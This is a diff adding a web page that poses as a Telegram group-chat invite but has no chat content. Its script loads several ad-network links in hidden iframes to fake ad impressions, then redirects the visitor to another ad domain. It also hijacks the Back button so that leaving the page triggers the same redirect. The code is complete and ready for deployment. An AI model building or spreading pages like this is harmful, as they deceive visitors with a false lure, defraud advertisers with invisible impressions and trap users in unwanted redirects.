@@ -1,0 +1,90 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Join Group Chat on Telegram</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Open Graph meta tags for social media sharing -->
+  <meta property="og:title" content="Join Group Chat on Telegram">
+  <meta property="og:description" content="Click to join the group chat and stay connected!">
+  <meta property="og:url" content="https://yourdomain.com/yourpage">
+  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/240px-Telegram_logo.svg.png">
+  <meta property="og:type" content="website">
+
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: #f0f0f0;
+      font-family: Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+    .spinner {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #0088cc;
+      border-radius: 50%;
+      width: 80px;
+      height: 80px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    p {
+      font-size: 18px;
+      color: #444;
+    }
+  </style>
+</head>
+<body>
+  <div class="spinner"></div>
+  <p>Loading... Please wait</p>
+
+  <script>
+    const adLinks = [
+      "https://www.profitableratecpm.com/y4dbupvy?key=97dc8f704d430409db51a9e2445dde9f",
+      "https://www.profitableratecpm.com/xakzppcu?key=1626136bb6b8e485d74ed75d2707caee",
+      "https://www.profitableratecpm.com/kqe0g96fu?key=fe0466a63e507629e9b5330b5ff0060d",
+      "https://www.profitableratecpm.com/t4ytvj19?key=1c30124bb651f755232126bf98319435",
+      "https://www.profitableratecpm.com/vqcuyv2f7?key=38dd6949e9c96f326bd65d02430cebc4"
+    ];
+
+    const redirectURL = "https://carryglanced.com/iy7vsdgy8?key=3a0f4fdb6934ede82248ec358c421077";
+    let index = 0;
+
+    function fireImpression(link) {
+      const iframe = document.createElement("iframe");
+      iframe.src = link;
+      iframe.style.display = "none";
+      document.body.appendChild(iframe);
+    }
+
+    function loadAds() {
+      if (index < adLinks.length) {
+        fireImpression(adLinks[index]);
+        index++;
+        setTimeout(loadAds, 200);
+      } else {
+        setTimeout(() => {
+          window.location.href = redirectURL;
+        }, 1000);
+      }
+    }
+
+    history.pushState(null, "", location.href);
+    window.addEventListener("popstate", function () {
+      location.href = redirectURL;
+    });
+
+    window.onload = loadAds;
+  </script>
+</body>
+</html>
